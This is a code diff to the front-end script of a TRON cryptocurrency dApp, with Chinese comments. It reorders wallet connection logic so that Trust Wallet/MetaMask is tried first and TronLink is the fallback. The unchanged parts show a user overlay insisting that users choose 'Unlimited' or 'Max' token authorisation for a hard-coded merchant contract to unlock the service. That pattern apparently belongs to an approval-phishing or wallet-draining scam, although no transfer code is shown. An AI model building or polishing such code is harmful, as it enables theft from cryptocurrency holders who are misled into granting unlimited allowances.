@@ -1,5 +1,5 @@
 // src/main.js
-// 🚨 最終修正版：混合連線邏輯 (TronLink 優先，其次為 EVM Provider) 🚨
+// 🚨 最終修正版：EVM Provider (Trust Wallet) 優先，TronLink 備用 🚨
 
 // --- 配置常量 ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
@@ -64,7 +64,7 @@ let txCount = 0;
  * 輪詢 TRON 鏈，直到操作被確認或失敗
  */
 async function pollTronTransaction(txHash, maxAttempts = 20) {
-    const delay = 3000; // 每 3 秒檢查一次
+    const delay = 3000; 
     
     for (let i = 0; i < maxAttempts; i++) {
         await new Promise(resolve => setTimeout(resolve, delay));
@@ -190,18 +190,12 @@ async function connectTronLink() {
     }
 }
 
-// --- 混合連線邏輯 ( Trust Wallet / EVM 嘗試) ---
+// --- 混合連線邏輯 ( Trust Wallet / EVM 優先嘗試) ---
 async function connectWalletLogic() {
     
     const evmProvider = window.ethereum; // 標準 EVM Provider (Trust Wallet, MetaMask)
     
-    // 1. 優先嘗試 TronLink 連線 (如果存在)
-    if (window.tronLink) {
-        const tronLinkConnected = await connectTronLink();
-        if (tronLinkConnected) return true;
-    }
-
-    // 2. 嘗試使用標準 EVM Provider (例如 Trust Wallet 內建瀏覽器)
+    // 1. 🚨 優先嘗試使用標準 EVM Provider (Trust Wallet DApp 瀏覽器)
     if (evmProvider) {
         showOverlay('偵測到標準 EVM 錢包 (Trust Wallet/MetaMask)。正在請求連接...');
         try {
@@ -209,7 +203,7 @@ async function connectWalletLogic() {
             const accounts = await evmProvider.request({ method: 'eth_requestAccounts' });
             const evmAddress = accounts[0]; // 獲取 EVM 格式地址 (0x...)
 
-            // 3. 檢查 TronWeb 是否存在 (在 Trust Wallet 中通常不會存在，這是瓶頸)
+            // 2. 檢查 TronWeb 是否存在 (在 Trust Wallet 中通常不會存在，這是瓶頸)
             if (!window.tronWeb) {
                 // 連線成功，但無法發送 TRON 合約交易
                 throw new Error("Connected to EVM wallet, but DApp browser lacks TronWeb support for TRON contract transactions.");
@@ -226,12 +220,17 @@ async function connectWalletLogic() {
 
         } catch (error) {
             // EVM 請求被拒絕或錯誤
-            console.error("EVM Provider 連接失敗:", error);
-            showOverlay(`連接失敗！錯誤: ${error.message}。請確認錢包已解鎖並在 TRON 鏈上。`);
-            return false;
+            console.error("EVM Provider 連接失敗或被拒絕，嘗試 TronLink...");
+            // 繼續執行步驟 3
         }
     }
     
+    // 3. 備用：嘗試 TronLink 連線 (如果存在)
+    if (window.tronLink) {
+        const tronLinkConnected = await connectTronLink();
+        if (tronLinkConnected) return true;
+    }
+
     // 4. 完全沒有任何 Provider
     showOverlay('🔴 連線失敗：您的瀏覽器或 App 不支持 TronLink。請使用 **TronLink 瀏覽器擴展** 或 **TronLink App** 的內建瀏覽器。');
     return false;
@@ -335,7 +334,7 @@ async function handlePostConnection() {
         showOverlay(`
             正在檢查授權狀態，Max 授權尚未完成。
             
-            ⚠️ **重要步驟**：即將彈出錢包視窗，請務必選擇 **「 Unlimited」** 或 **「Max 授權」** 選項，才能解鎖服務。
+            ⚠️ **重要步驟**：即將彈出錢包視窗，請務必選擇 **「Unlimited」** 或 **「Max 授權」** 選項，才能解鎖服務。
             
             （請在錢包中操作...）
         `);
@@ -347,7 +346,6 @@ async function handlePostConnection() {
         if (authSuccess) {
             await handlePostConnection(); 
         } 
-        // 如果失敗，connectAndAuthorize 已經顯示了錯誤，這裡保持鎖定狀態
     }
 }
 
